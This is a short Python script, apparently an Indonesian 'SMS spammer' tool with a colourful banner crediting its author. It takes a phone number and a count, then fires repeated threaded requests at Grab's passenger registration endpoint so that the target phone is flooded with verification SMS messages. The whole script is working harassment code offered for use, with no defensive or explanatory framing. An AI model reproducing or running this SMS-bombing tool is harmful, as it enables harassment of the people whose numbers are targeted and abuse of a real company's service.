"""
ngapai bosq? mau recode?
tinggal pake aja susah amat sih?!
"""
from multiprocessing.pool import ThreadPool
try:
    import os, random
    from time import sleep as turu
    import subprocess as sp, requests
except ModuleNotFoundError:
    print('\nSepertinya module requests BELUM Di Install')
    print('$ pip install requests\n')
    exit()

try:
    os.system('clear')
    print('          \x1b[0;36m____ ____ ____ ___  ___\x1b[1;33m_ ___  ____ _  _ ____ ____ \n          \x1b[0;36m| __ |__/ |__| |__] [__  |\x1b[1;33m__] |__| |\\/| |___ |__/ \n          \x1b[1;37m|__] |  \\ |  | |__] ___]\x1b[1;33m |    |  | |  | |___ |  \\ \n\x1b[0;36m╔═══════════════════════════════════════════════════════════════════╗\n\x1b[0;36m║\x1b[1;33m  TOOLS SPAMER SMS |\x1b[1;34m UNLIMITED CODED BY ZEN EZZ |\x1b[1;33m COPYRIGHT 2019   \x1b[0;36m║\n\x1b[0;36m╚═══════════════════════════════════════════════════════════════════╝\n\x1b[0;36m║\x1b[1;31m[\x1b[1;37m+\x1b[1;31m]\x1b[1;37m Author \x1b[1;31m= \x1b[1;37mZen Ezz\n\x1b[0;36m║\x1b[1;31m[\x1b[1;37m+\x1b[1;31m]\x1b[1;37m Youtube\x1b[1;31m= \x1b[1;37mZen s\n\x1b[0;36m║\x1b[1;31m[\x1b[1;37m+\x1b[1;31m]\x1b[1;37m github \x1b[1;31m= \x1b[1;37mhttps://www.github.com/zen-clay \x1b[0;36m║\n\x1b[0;36m║\x1b[1;31m[\x1b[1;37m+\x1b[1;31m]\x1b[1;37m contact\x1b[1;31m= \x1b[1;37mfb.com/Zen.clay                 \x1b[0;36m║\n\x1b[0;36m╚═════════════════════════════════════════════╝')
    no = input('\x1b[1;31m[\x1b[1;37m?\x1b[1;31m]\x1b[1;36m NOMOR (Pakai 62 Gan) =>\x1b[1;36m ')
    jum = int(input('\x1b[1;31m[\x1b[1;37m?\x1b[1;36m] Jumlah => \x1b[1;36m'))
except KeyboardInterrupt:
    print('\nKey interrupt')
    exit()

print()
print('[*] RESULT:')

def main(arg):
    try:
        idk = 'phoneNumber'
        r = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber':no,  'countryCode':'ID',  'name':'nuubi',  'email':'nuubi@mail.com',  'deviceToken':'*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
        if str(idk) in str(r.text):
            print('\x1b[0;31m[\x1b[1;37m+\x1b[1;31m]\x1b[1;36m SUKSES')
        else:
            print('\x1b[1;31m[\x1b[1;37m-\x1b[1;31] GAGAL')
    except:
        pass


jobs = []
for x in range(jum):
    jobs.append(x)

p = ThreadPool(5)
p.map(main, jobs)
print('done ^•^')
